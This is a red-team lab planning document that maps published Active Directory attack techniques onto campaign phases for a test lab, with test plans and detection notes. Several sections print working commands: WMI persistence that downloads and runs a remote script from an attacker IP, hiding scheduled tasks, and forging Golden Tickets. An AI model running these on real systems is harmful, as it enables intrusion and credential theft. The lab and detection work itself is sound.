# Campaign Suggestions — SpecterOps Blog Cross-Reference

**Purpose:** Map research articles to specific campaign phases. Test each technique before integrating into CAMPAIGNS.md.

**Status:** Planning — test before deploy.

**DFIR parallel track:** [`DFIR-Nexus-Pioneer-workflow.md`](DFIR-Nexus-Pioneer-workflow.md) — links each campaign exercise to DFIR-Nexus ingest, cases, and `tracker.md` (Phase 3.5 active).

**Legend:** ✅ = adopted into CAMPAIGNS.md | ⏳ = pending test | 🔬 = research only | ⏭️ = skip

---

## Summary — All Items at a Glance

✅ = adopted into CAMPAIGNS.md | ⏳ = pending | 🔬 = research only | ⏭️ = skip

| Phase | Method | Status |
|:------|:-------|:-------|
| **Phase 0 — Recon** | ADWS Enumeration (SOAP port 9389) | ✅ |
| | DNS Enumeration (adidnsdump) | ✅ |
| | SAMR Enumeration (NetUserEnum — LDAP-free) | ✅ |
| | Honeypot Detection via lastLogon | ✅ |
| **Phase 2 — Credential Harvesting** | MSSQLHound (SQL enumeration) | ✅ |
| | NTLMv1 Rainbow Tables | ✅ |
| **Phase 3 — Execution** | WinGet Proxy Execution (LOLBAS) | ✅ |
| | GAC Hijacking (.NET injection) | ✅ |
| | SQL Server 2025 AI Abuse (exfil/coercion/C2) | ✅ |
| | UACME (UAC Bypass) | ✅ |
| | Handle Leak Exploitation | ✅ |
| | MSBuild.exe (XML project file execution) | ✅ |
| | mshta.exe (HTA/VBScript execution) | ✅ |
| | regsvr32.exe (scriptlet execution) | ✅ |
| | rundll32.exe (DLL/JS execution) | ✅ |
| | bitsadmin.exe (download + execute) | ✅ |
| | msiexec.exe (MSI execution) | ✅ |
| | InstallUtil.exe (.NET AWL bypass) | ✅ |
| | cmstp.exe (INF execution + AWL bypass) | ✅ |
| | Electron App Backdooring (Loki C2) | ✅ |
| **Phase 3.5 — Credential Access** | Offensive DPAPI (Nemesis) | ✅ |
| | ctfmon.exe Password Extraction | ✅ |
| | LSASS Dump via WerFault | ✅ |
| | LAPS Extraction | ✅ |
| | Windows Logon Types (credential location ref) | ✅ |
| | Credential Guard Bypass (study ref) | ✅ |
| | Azure AD Connect DPAPI Dump (adconnectdump) | ✅ |
| **Phase 4 — Discovery** | SharpHound Detection (study ref) | ✅ |
| **Phase 5 — Persistence** | WMI Event Subscriptions (fileless) | ✅ |
| | Invisible Scheduled Tasks (SD deletion) | ✅ |
| | DLL Hijacking | ⏳ |
| | COM Hijacking | ⏳ |
| | IFEO (Image File Execution Options) | ⏳ |
| | LSA SSP / Password Filter | ⏳ |
| | Named Pipe Impersonation (Piper) | ⏳ |
| | Token Dance (token manipulation) | ⏳ |
| | EntryPoint Hijacking (code injection) | ⏳ |
| | Shift Happens (context menu — negative test) | ⏳ |
| | Electron App Backdooring (Loki C2, signed app bypass) | ✅ |
| **Phase 6 — Lateral Movement** | ghostsurf (NTLM Relay to browser) | ✅ |
| | Cross-Session Activation (COM lateral) | ⏳ |
| | SpeechRuntime Lateral | ⏳ |
| | DCOMIllusionist (fileless .NET deserialization) | ⏳ |
| | RBCD (Resource-Based Constrained Delegation) | ⏳ |
| | Unconstrained Delegation (krbrelayx / mbr01) | ⏳ |
| | NTLM Relay to ADCS ESC8 (ntlmrelayx + coerce) | ⏳ |
| | SMB-to-LDAP Relay (CVE-2019-1040) | ⏳ |
| | Kerberos Relay over DNS (mitm6 + krbrelayx) | ⏳ |
| **Phase 7 — Privilege Escalation (DCSync)** | Golden/Silver Ticket | ⏳ |
| | DCSync Attack and Detection (study ref) | ✅ |
| | Zerologon (alternative exploitation) | ⏳ |
| **Phase 8 — Forest Trust** | BadSuccessor + Golden dMSA (Server 2025) | ⏳ |
| | BetterSuccessor (dMSA post-patch) | ⏳ |
| | Forest Trust SID Filtering (study ref) | ✅ |
| | Forest Trust Bypass CVE-2020-0665 (study ref) | ✅ |
| **Branch B — ADCS** | Certified Pre-Owned (ESC1-8) | ✅ |
| | UnPAC-the-Hash (cert → NT hash) | ⏳ |
| | ESC16 (CA-level SID extension disable) | ⏳ |
| **Branch C — SCCM** | Ludus SCCM Lab | ✅ |
| **Branch D — Linux** | GTFOBins (python, perl, find, vim, awk, curl, env, tee) | ✅ |
| **Branch F — Supply-Chain** | Shai-Hulud 2.0 / NPMHound | ✅ |
| **Campaign H — Initial Access** | Device Code Phishing (OAuth) | ⏳ |
| **Plan 11 — Cloud/Entra ID** | Pass-the-Cert (Entra ID lateral movement) | ⏳ |
| | Actor Tokens → Global Admin (Dirk-jan 2025) | ⏳ |
| | Cloud Kerberos Trust → Domain Admin (Dirk-jan 2023) | ⏳ |
| | PRT Phishing (Dirk-jan 2023) | ⏳ |
| | Intune ADCS ESC1 (Dirk-jan 2025) | ⏳ |
| | Temporary Access Pass lateral movement (Dirk-jan 2024) | ⏳ |
| | Federated Credentials persistence (Dirk-jan 2024) | ⏳ |
| | Abusing Application Admin → Global Admin (Dirk-jan 2019) | ⏳ |
| **Detection Engineering** | ETW Internals (telemetry tampering) | ⏳ |
| **External Vuln Research (2026-06-18)** | MiniPlasma (CVE-2020-17103 unpatched → SYSTEM) | 🔬 |
| | GreenPlasma (CTFMON arbitrary section → EoP) | 🔬 |
| | YellowKey (BitLocker bypass via FsTx + WinRE) | 🔬 |
| **Phase 5 — Lateral Movement** | UnCanny Coerce (NTLM coercion via InstallService) | ⏳ |
| **Phase 3.5 — Credential Access** | UnCanny LPE (Non-admin → SYSTEM via InstallService) | ⏳ |
| **Detection Engineering** | IPv4-mapped IPv6 URL Parser Bypass (SANS ISC 33090) | ⏳ |
| **Post-DA Cleanup** | KDS Root Key Extraction (prerequisite for #85-89) | ⏳ |
| | Golden gMSA Attack (offline password computation) | ⏳ |
| | DSRM Password Extract & Set (DC persistence) | ⏳ |
| | LAPS Bulk Extraction (DSInternals enhancement) | ⏳ |
| | Golden dMSA Attack (Server 2025) | ⏳ |
| | DPAPI-NG SID Protector Decryption (BitLocker/PFX/DNSSEC/ASP.NET) | ⏳ |
| **Phase 5 → Phase 7 Shortcut** | Onelogon Zero-Channel (single-channel NRPC bypass — WOOT 2026) | ⏳ |
| **Phase 3.5 alt → Phase 7** | Onelogon AES-CBC8 Downgrade (KRBTGT hash extraction — WOOT 2026) | ⏳ |
| **Phases 0-5 cross-cutting** | NetExec (nxc) — CrackMapExec replacement | 🆕 |
| **Phase 3.5 (Credential Access)** | DonPAPI v2.0+ — Remote DPAPI harvesting | 🆕 |
| **Phase 3.5 (Credential Access)** | lsassy v3.1.16 — Remote LSASS dump (15+ methods) | 🆕 |
| **Branch 3.5 (LPE)** | KrbRelay + KrbRelayUp — LPE via Kerberos relay | 🆕 |
| **Plan 11 (Cloud/Entra)** | BARK (BloodHound Attack Research Kit) | ⏳ |
| **Agentic Offense (parallel)** | CADRE-Strike — Agentic AD Reasoning Engine | 📋 Tracked (Track H) |
| **Phase 0 + Branch A + B** | ADeleg — GUI tool for ACL/ADCS recon | 🆕 |
| **Phase 1/2/5/6/7/8 (study ref)** | Windows Security Internals — Kerberos/AD internals | ⏳ |
| **Phase 0/1 (Recon)** | dsHeuristics abuse (forest-level AD behavior) | 🆕 |
| **Phase 8 alt (Forest Trust)** | Skipjack — PAC signature downgrade (GhostWolfLab 2026-06-23) | ⏳ |
| **Phase 0/3.5/5** | NetExec `coerce_plus` + 5 new modules (`pre2k`, `enum_av`, `get-desc-users`, `winscp`, `rdp`) + `--kdcHost` flag | 🆕 |
| **Exercise (Standalone)** | CVE-2026-41089 Netlogon RCE (PoC available — pre-auth DC crash) | 🆕 |
| **Plan 0.8 + Track H (defensive)** | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ |
| **Research** | MSSQL + SCCM CVEs | 🔬 |
| **Reference** | How We Think about Red Teading | — |
| | Attack Paths Don't Stop at IdP | — |
| | dirkjanm.io — AD/Azure Research Blog | — |
| **Skip** | Don't Jump the Turnstile | ⏭️ |

**Counts:** ✅ Adopted: 24 | ⏳ Pending: 54 | 🔬 Research: 4 | ⏭️ Skip: 1 | Reference: 2 | 🆕 New: 12 | **Total: 97**

---

## Tier 1 — Directly Maps to Our Attack Surface

### 1. MSSQLHound Now Available in Go ✅

**Source:** https://specterops.io/blog/2026/04/23/mssqlhound-now-available-in-go/
**Tool:** MSSQLHound (Go port)
**Status:** ✅ Adopted into CAMPAIGNS.md — Reconnaissance with svc_mssql (Step B)

**Relevance to CADRE:** Phase 3/4 — MSSQL attack paths. Collects SQL logins, roles, impersonation, linked servers for BloodHound visualization. We have 3 SQL instances (mbr01, mbr02, linux01) with linked servers, IMPERSONATE grants, and xp_cmdshell.

**Campaign location:** Reconnaissance with svc_mssql (Step B) + Phase 4 (BloodHound discovery).

**Testing plan:**
1. Deploy MSSQLHound on provisioning
2. Run against mbr01 with svc_mssql credentials
3. Collect SQL-level attack paths (impersonation, linked servers, sysadmin)
4. Import into BloodHound for visualization
5. Compare with manual SQL enumeration results

---

### 2. MSSQL and SCCM Elevation of Privilege Vulnerabilities 🔬

**Source:** https://specterops.io/blog/2026/01/15/mssql-and-sccm-elevation-of-privilege-vulnerabilities/
**CVEs:** CVE-2025-49758 (MSSQL), CVE-2025-47179 (SCCM)
**Status:** 🔬 Research only — CADRE is misconfig lab, not vuln lab

**Relevance to CADRE:** Research/optional only. These CVEs apply only if we pin SQL/SCCM builds to vulnerable versions.

**Campaign location:** Research only — not spine. Integrate only if we add a "vulnerable build" track.

---

### 3. Offensive DPAPI With Nemesis — DPAPI Credential Theft ✅

**Source:** https://specterops.io/blog/2026/03/04/offensive-dpapi-with-nemesis/
**Tool:** Nemesis 2.2+
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch 3.5G

**Relevance to CADRE:** Branch 3.5G. Automates DPAPI decryption chain — SYSTEM/user masterkeys → CNG keys → Chromium App-Bound encryption. With SYSTEM on mbr01, we can decrypt any user's DPAPI-protected data.

**Campaign location:** Branch 3.5G — after 3.5F/3.5A verified.

**Prerequisite:** Stage saved creds in analyst_cloud profile (playbook or manual).

---

### 4. Windows 11 Input Telemetry — ctfmon.exe Password Extraction ✅

**Source:** https://hexderef.com/windows-11-passwords-in-memory-lsass-ctfmon-analysis
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch 3.5H

**Relevance to CADRE:** Branch 3.5H. Typed passwords remain in ctfmon.exe memory AFTER application closes. ctfmon.exe is NOT a protected process. Credential Guard does NOT protect these passwords.

**Campaign location:** Branch 3.5H — after SYSTEM on mbr01.

---

### 5. Certified Pre-Owned (ADCS ESC1-ESC8) ✅

**Source:** https://specterops.io/blog/2021/06/17/certified-pre-owned/
**Whitepaper:** https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch B (ADCS)

**Campaign location:** Branch B — after Phase 4 (BloodHound discovery).

---

### 6. Graph the Planet: Shai-Hulud 2.0 — NPMHound (Supply Chain) ✅

**Source:** https://specterops.io/blog/2026/03/19/graph-the-planet-shai-hulud-2-0/
**Tool:** NPMHound
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch F (Supply-chain)

**Campaign location:** Branch F — standalone, after Plan 0.8 install.

---

### 7. Ludus SCCM Lab Expansion ✅

**Source:** https://specterops.io/blog/2026/04/01/ludus-sccm-lab-expansion/
**Tool:** ConfigManBearPig (PowerShell)
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch C (SCCM)

**Campaign location:** Branch C — after Phase 5.

---

### 8. WMI Event Subscriptions — Fileless Persistence ✅

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1546.003
**Status:** ✅ Adopted into CAMPAIGNS.md — Branch 3.5J

**Relevance to CADRE:** Fileless persistence — no disk artifacts, no registry run keys, no scheduled tasks. Blue teams need Sysmon Event IDs 19/20/21 to catch this. With SYSTEM on mbr01, we can install WMI subscriptions that fire on system startup.

**Campaign location:** Branch 3.5J — after SYSTEM on mbr01.

**Why this works on Server 2025:**
- No disk artifacts (fileless)
- Not visible in Autoruns, Run keys, or Scheduled Task scanners
- Survives reboots
- Requires Sysmon 19/20/21 for detection (most labs don't have it)

**Testing plan:**
1. From SYSTEM via xp_cmdshell, install WMI Event Subscription
2. Trigger: system startup (uptime > 60 seconds)
3. Action: execute SharpHound or reverse shell
4. Verify subscription persists after reboot
5. Document telemetry (Sysmon 19/20/21)

**Commands (from SYSTEM):**
```powershell
# Create filter (trigger: system startup)
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = "CADRE-WMI-Persistence"
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60"
$filter.EventNamespace = "Root\Cimv2"
$filter.Put()

# Create consumer (action: execute command)
$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "CADRE-WMI-Consumer"
$consumer.CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.77.60:8080/shell.ps1')"
$consumer.Put()

# Bind filter to consumer
$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.Path
$binding.Consumer = $consumer.Path
$binding.Put()
```

---

---

### 10. Invisible Scheduled Tasks — Security Descriptor Deletion ✅

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1053.005
**Status:** ✅ Adopted into CAMPAIGNS.md — enhances 3.5B

**Relevance to CADRE:** Enhances Branch 3.5B (Scheduled Task as analyst_cloud). By deleting the Security subkey under a task in the registry, the task becomes completely invisible to: `schtasks /query`, Task Scheduler GUI, PowerShell `Get-ScheduledTask`, Autoruns.

**Campaign location:** Enhance Branch 3.5B — add SD deletion after task creation.

**Why this works on Server 2025:**
- Task still runs on schedule
- Invisible to all standard enumeration tools
- Blue teams need raw registry access under SYSTEM to find it

**Testing plan:**
1. Create scheduled task as analyst_cloud (existing 3.5B)
2. Delete Security subkey from registry
3. Verify task is invisible to `schtasks /query`
4. Verify task still executes
5. Document telemetry (Sysmon 12/13)

**Commands:**
```sql
-- Create task (existing 3.5B)
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr ... /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';

-- Delete Security subkey (makes task invisible)
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg delete HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CADRE-SharpHound\Security /f"';
```

---

### 11. Golden Ticket / Silver Ticket — AD Persistence ⏳

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1558.001 / T1558.002
**Status:** ⏳ Pending — enhances Phase 6/7

**Relevance to CADRE:** Enhances Phase 6 (DCSync) and Phase 7 (Forest Trust). After DCSync gives us KRBTGT hash, we can forge Golden Tickets (domain-wide) or Silver Tickets (service-specific). These persist even after credential resets.

**Campaign location:** After Phase 6 (DCSync) — add Golden/Silver Ticket as persistence.

**Why this works on Server 2025:**
- Golden Ticket: forged TGT signed with KRBTGT hash — cryptographically valid
- Silver Ticket: forged TGS signed with service account hash — no KDC contact needed
- Both survive credential resets (unless KRBTGT password is changed twice)

**Testing plan:**
1. DCSync to get KRBTGT hash (Phase 6)
2. Forge Golden Ticket for Administrator
3. Use ticket to access DC01 without password
4. Document telemetry (Sysmon 1, 3)

**Commands:**
```bash
# From Kali with KRBTGT hash
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXXX -domain child.cadre.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
```

---

### 12. Device Code Phishing — OAuth Abuse ⏳

**Source:** DbgMan — Initial Access: Modern Intrusion Techniques
**MITRE:** T1566.003
**Status:** ⏳ Pending — new initial access vector

**Relevance to CADRE:** New initial access technique for Campaign H. Victim enters code on legitimate Microsoft login page — attacker gets persistent access token. No phishing page needed.

**Campaign location:** Campaign H (Initial Access) — new technique alongside WT063-068.

**Why this works on Server 2025:**
- Victim authenticates on real Microsoft page
- Bypasses MFA completely (token includes MFA claims)
- No phishing infrastructure to get burned
- Tokens can last days/weeks

**Testing plan:**
1. Generate device code via Microsoft OAuth endpoint
2. Send to victim (simulated via playbook)
3. Victim enters code on legitimate page
4. Attacker captures token
5. Document telemetry

---

## Tier 2 — Useful Tradecraft

### 13. ghostsurf: NTLM Relay to Browser Session Hijacking ✅

**Source:** https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/
**Status:** ✅ Adopted into CAMPAIGNS.md — Phase 5 (Lateral Movement)

**Campaign location:** Phase 5 — NTLM relay to ESC8 or coercion relay chain.

---

### 14. Shift Happens — Command Injection in Windows Context Menus ⏳

**Source:** https://specterops.io/blog/2026/05/07/shift-happens-uncovering-two-built-in-command-injections-in-windows-context-menus/
**Status:** ⏳ Negative test — Server 2025 likely patched

**Campaign location:** Branch 3.5D — test if still works, document if patched.

---

### 15. Into The Rainbow — NTLMv1 Rainbow Tables ✅

**Source:** https://specterops.io/blog/2026/04/16/into-the-rainbow-googles-ntlmv1-rainbow-tables-explained-in-a-bit-too-much-detail/
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 2 — NTLMv1 Rainbow Tables section (after Kerberoast block, before "Reconnaissance with svc_mssql"). Full test plan + detection.

**Campaign location:** Phase 2 — one-time check if NTLMv1 hashes exist.

---

### 16. Don't Jump the Turnstile — Phishing Sandbox Bypass ⏭️

**Source:** https://specterops.io/blog/2026/05/28/dont-jump-the-turnstile-lessons-from-the-field/
**Status:** ⏭️ Skip — no Cloudflare in lab

---

## Tier 3 — Background/Context

### 17. How We Think about Red Teaming

**Source:** https://specterops.io/blog/2026/05/06/how-we-think-about-red-teaming/
**Status:** Reference only — methodology

---

### 18. Attack Paths Don't Stop at Identity Providers

**Source:** https://specterops.io/blog/2026/03/24/attack-paths-dont-stop-at-identity-providers/
**Status:** Future — Azure/Okta expansion

---

## iPurple.team Additions (2024-2026)

### 19. AD Enumeration via ADWS ✅

**Source:** https://ipurple.team/2025/08/12/active-directory-enumeration-adws/
**MITRE:** T1018 (Remote System Discovery)
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 0 — Step 3 (ADWS Enumeration on SOAP port 9389). All 3 DCs verified open via nmap (2026-06-18). Awaiting auth test.

**Relevance to CADRE:** Active Directory Web Services (ADWS) runs on all DCs on port 9389. Provides SOAP-based enumeration as alternative to LDAP. Server 2025 blocks anonymous LDAP — but ADWS may behave differently. Worth testing as Phase 0 recon vector.

**Campaign location:** Phase 0 — Reconnaissance. Add as Step 3 after Kerberos user enum.

**Testing plan:**
1. From Kali, connect to dc02:9389 via ADWS
2. Enumerate users/groups via SOAP queries
3. Compare with LDAP enumeration results
4. Document if anonymous ADWS is blocked on Server 2025

**Why this works:**
- ADWS is enabled by default on Server 2025 DCs
- Uses different authentication path than LDAP
- May leak information even when LDAP anonymous is blocked

---

### 20. LSASS Dump via Windows Error Reporting (WerFault) ✅

**Source:** https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/
**MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
**Status:** ✅ Adopted into CAMPAIGNS.md Branch 3.5 — 3.5K (LSASS Dump via WerFault). Full test plan + telemetry expectations.

**Relevance to CADRE:** WerFaultSecure is a Microsoft-signed binary that can dump LSASS memory. Stealthier than procdump (which is often flagged by EDR). Works by triggering a crash dump via Windows Error Reporting.

**Campaign location:** Branch 3.5F — add as alternative LSASS dump method.

**Why this works on Server 2025:**
- WerFaultSecure is Microsoft-signed (trusted binary)
- Not flagged by most EDR solutions
- Dumps LSASS to file for offline extraction
- Works even when procdump is blocked

**Testing plan:**
1. Transfer WerFaultSecure approach to mbr01 via SYSTEM
2. Trigger LSASS dump via WER
3. Extract credentials with pypykatz/mimikatz offline
4. Compare telemetry with procdump approach

---

### 21. Cross-Session Activation (COM Lateral Movement) ⏳

**Source:** https://ipurple.team/2026/05/04/cross-session-activation/
**MITRE:** T1021.003 (Distributed COM)
**Status:** ⏳ Pending — new Phase 5 lateral technique

**Relevance to CADRE:** Cross-Session Activation (CSA) uses COM activation to execute code in another user's session without traditional lateral movement APIs (PsExec, WMI, WinRM). Stealthier than PsExec — no service creation, no named pipes.

**Campaign location:** Phase 5 — add as lateral movement alternative.

**Why this works on Server 2025:**
- COM activation is legitimate Windows functionality
- No service creation (avoids 4698 events)
- No named pipe (avoids PsExec detection)
- EDR vendors still catching up to CSA detection

**Testing plan:**
1. From SYSTEM on mbr01, activate COM object in analyst_cloud's session
2. Execute command as analyst_cloud
3. Document telemetry (Sysmon, WinSec)
4. Compare with PsExec/WMI/DCOM lateral movement

---

### 22. SharpHound Detection ✅

**Source:** https://ipurple.team/2024/07/15/sharphound-detection/
**MITRE:** T1087.002 (Account Discovery: Domain Account)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 4). Read before executing Phase 4 SharpHound collection.

**Relevance to CADRE:** Documents what SharpHound collection looks like to defenders. We run SharpHound in Phase 4 — understanding the detection signature helps us validate our detection rules and understand what telemetry BH collection generates.

**Campaign location:** Phase 4 — add as detection reference for BH collection.

**What it covers:**
- SharpHound network patterns (LDAP queries, RPC calls)
- Endpoint telemetry (process create, file writes)
- Detection rules for SharpHound enumeration
- How to distinguish BH collection from normal AD queries

**Why this matters for CADRE:**
- We need to know what our BH collection looks like to defenders
- Validates our detection rules for Phase 4
- Helps us write better cadre-* detection rules

---

### 23. BadSuccessor + Golden dMSA (Server 2025) ⏳

**Source:** https://ipurple.team/2025/07/28/badsuccessor/ and https://ipurple.team/2025/09/02/golden-dmsa/
**MITRE:** T1558.004 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — Server 2025 specific

**Relevance to CADRE:** dMSA (delegated Managed Service Account) is a new Server 2025 feature designed to prevent Kerberoasting. BadSuccessor and Golden dMSA abuse dMSA objects for credential theft and persistence. CADRE runs Server 2025 — this is a real attack surface.

**Campaign location:** Phase 7 — add as dMSA abuse technique.

**Why this works on Server 2025:**
- dMSA is a new feature in Server 2025
- BadSuccessor: create dMSA object → inherit privileges from parent account
- Golden dMSA: forge dMSA authentication material for persistence
- Both bypass the security dMSA was designed to provide

**Already partially covered:** Impacket-IoCs IoC 35 documents `BadSuccessor.py` patterns (dMSA naming, migration attributes).

---

### 24. WinGet — Proxy Execution via Windows Package Manager ✅

**Source:** https://ipurple.team/2026/06/09/winget/
**MITRE:** T1218 (System Binary Proxy Execution)
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 3 — Alternative Execution Techniques → WinGet Proxy Execution (T1218). Full test plan via mssql-shell as SYSTEM.

**Relevance to CADRE:** WinGet (Windows Package Manager) is installed by default on Windows 11 and Server 2022+. It's a Microsoft-signed binary that can be abused to proxy execution, download payloads from remote sources, and evade application allowlisting. Common in dev/admin environments.

**Campaign location:** Phase 3 (Execution) or Branch 3.5D (File Detonation) — LOLBAS proxy execution.

**Why this works on Server 2025:**
- WinGet is Microsoft-signed (trusted binary)
- Can download and execute packages from remote sources
- Bypasses application allowlisting (AppLocker, WDAC)
- Default on modern Windows — no additional tools needed

**Techniques:**
- `winget install` — download and execute installer from remote source
- `winget upgrade` — replace legitimate package with malicious version
- `winget settings` — modify WinGet configuration for persistence
- Proxy execution via `--override` flag with arbitrary commands

**Testing plan:**
1. From SYSTEM on mbr01, use `winget install` to download payload from attacker HTTP server
2. Or use `winget --override` to execute arbitrary commands
3. Document telemetry (Sysmon EID 1, 11, network)
4. Compare with certutil/bitsadmin LOLBAS techniques

**Detection:** Sysmon EID 1 (winget.exe process create), EID 11 (file write from winget), network connection to external package source. WinGet logs to `%LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\DiagOutputDir\`.

---

### 25. EntryPoint Hijacking ⏳

**Source:** https://ipurple.team/2026/05/13/entrypoint-hijacking/
**MITRE:** T1055 (Process Injection)
**Status:** ⏳ Pending — code injection technique

**Relevance to CADRE:** Stealthy code injection that doesn't rely on CreateRemoteThread or other APIs EDR monitors. Arbitrary code is written to memory but executes only when the process legitimately runs. Independent of the attack chain — works as a post-exploitation technique.

**Campaign location:** Branch 3.5D (File Detonation) — alternative code execution method.

**Why this works on Server 2025:**
- No thread creation API calls (avoids common EDR hooks)
- Code executes in context of legitimate process
- Difficult to detect without memory scanning

**Detection:** Sysmon EID 10 (process access), EID 8 (CreateRemoteThread — NOT present in this technique, which is the point). Memory scanning for injected code. EDR behavioral analysis.

---

### 26. Microsoft Speech Runtime Lateral Movement ⏳

**Source:** https://ipurple.team/2026/04/07/microsoft-speech/
**MITRE:** T1021 (Remote Services)
**Status:** ⏳ Pending — novel lateral movement

**Relevance to CADRE:** SpeechRuntime.exe is a legitimate Windows component. Threat actors with elevated privileges can execute code under the context of this binary for lateral movement. Novel technique — EDR vendors still catching up.

**Campaign location:** Phase 5 — lateral movement alternative alongside PsExec/WMI/DCOM.

**Why this works on Server 2025:**
- SpeechRuntime.exe is a trusted Windows binary
- Not commonly monitored by EDR for lateral movement
- Works from SYSTEM context

**Detection:** Sysmon EID 1 (SpeechRuntime.exe process create with unexpected parent), EID 3 (network connection from SpeechRuntime.exe).

---

### 27. GAC Hijacking (.NET Assembly Injection) ✅

**Source:** https://ipurple.team/2026/02/10/gac-hijacking/
**MITRE:** T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
**Status:** ✅ Adopted into CAMPAIGNS.md Phase 3 — Alternative Execution Techniques → GAC Hijacking (.NET Assembly Injection) (T1574.001). Full test plan.

**Relevance to CADRE:** Global Assembly Cache (GAC) is a .NET system-wide repository. Hijacking GAC assemblies allows code execution in context of any .NET application. CADRE has MSSQL (which uses .NET assemblies) — GAC hijacking could execute code in SQL Server's context.

**Campaign location:** Phase 3 (Execution) or Branch 3.5D — .NET-specific technique.

**Why this works on Server 2025:**
- MSSQL uses .NET assemblies (CLR integration is enabled on mbr02)
- GAC is a trusted system location
- Assemblies loaded automatically by .NET runtime
- No process creation needed — code runs in existing .NET process

**Detection:** Sysmon EID 11 (file write to `%windir%\Microsoft.NET\assembly\`), EID 7 (image load of unsigned assembly), CLR loading logs.

---

### 28. Credential Guard Bypass Research ✅

**Source:** https://ipurple.team/2026/03/17/credential-guard/
**MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 3.5). Read before running 3.5F to understand which mimikatz modules fail when Credential Guard is on (and why our CADRE lab tests work).

**Relevance to CADRE:** Deep-dive on Credential Guard architecture and known bypass research. Our lab has Credential Guard OFF (by design), but this article documents what defenders should know and what attackers can do when CG is ON. Critical study material for understanding why 3.5F works in our lab but would fail in hardened environments.

**Campaign location:** Branch 3.5F — add as study reference for LSASS dump context.

**What it covers:**
- VBS-based credential isolation architecture
- Known bypass techniques (CVE-based and architectural)
- Why LSASS dump fails with CG enabled
- Alternative credential theft when CG is active

---

### 29. UnPAC-the-Hash — NT Hash from Certificate via U2U ⏳

**Source:** https://specterops.io/blog/2026/06/09/user-to-user-authentication-down-the-rabbit-hole-part-1/
**MITRE:** T1649 (Steal or Forge Authentication Certificates), T1558.004 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — chains with ADCS ESC attacks (Branch B)

**Relevance to CADRE:** UnPAC-the-Hash extracts the NT hash from a PKINIT TGT via U2U service ticket. This is the bridge between "get certificate" (ADCS ESC1-ESC4) and "get NT hash" (Pass-the-Hash). CADRE already has ESC1-14 templates deployed — UnPAC-the-Hash is the natural next step after certificate enrollment.

**Campaign location:** Branch B (ADCS) — post-ESC credential extraction. Chains: ESC1 → certificate → PKINIT → TGT → UnPAC-the-Hash → NT hash → Pass-the-Hash.

**Why this works on Server 2025:**
- PKINIT embeds NT hash in PAC inside TGT (for legacy NTLM support)
- U2U service ticket encrypted with own TGT session key — attacker can decrypt
- `certipy auth` handles the entire chain automatically
- No additional tools needed beyond Certipy

**Attack chain:**
1. `certipy req` — get certificate via ESC1
2. `certipy auth -pfx administrator.pfx` — PKINIT + UnPAC-the-Hash → NT hash
3. `psexec.py -hashes :<NTLM> administrator@dc01` — Pass-the-Hash

**Detection:** WinSec 4768 PreAuthType=16 (PKINIT) followed by 4769 for own SPN with `ENC-TKT-IN-SKEY`. Zeek kerberos.log: additional ticket in TGS-REQ.

**Part 2 pending:** SpecterOps will publish deeper U2U abuse techniques.

**Study guide:** `05-study-guide/kerberos-u2u-unpac-the-hash.md`

---

### 30. ETW Internals — Telemetry Tampering Detection ⏳

**Source:** https://kernullist.github.io/kernullist-blog/posts/etw-internals-deep-dive/
**Date:** 2026-06-03
**MITRE:** T1562.006 (Impair Defenses: Indicator Blocking)
**Status:** ⏳ Pending — detection engineering reference

**Relevance to CADRE:** ETW is the telemetry fabric behind Elastic Defend, Sysmon, and all modern EDRs. Attackers can tamper with ETW providers to blind defenders — patching `EtwEventWrite`, unloading providers, or modifying registration. Understanding ETW internals helps CADRE detect when attackers try to disable telemetry. Directly relevant to our detection rules.

**Campaign location:** Detection engineering — not an attack technique. Reference for building cadre-* rules that detect ETW tampering.

**What it covers:**
- ETW provider registration architecture
- How attackers patch ETW (EtwEventWrite, NtTraceEvent hooks)
- Process-level ETW tampering
- Cross-view detection strategies

**Why this matters for CADRE:**
- Elastic Defend and Sysmon both depend on ETW
- If an attacker patches ETW, our telemetry goes dark
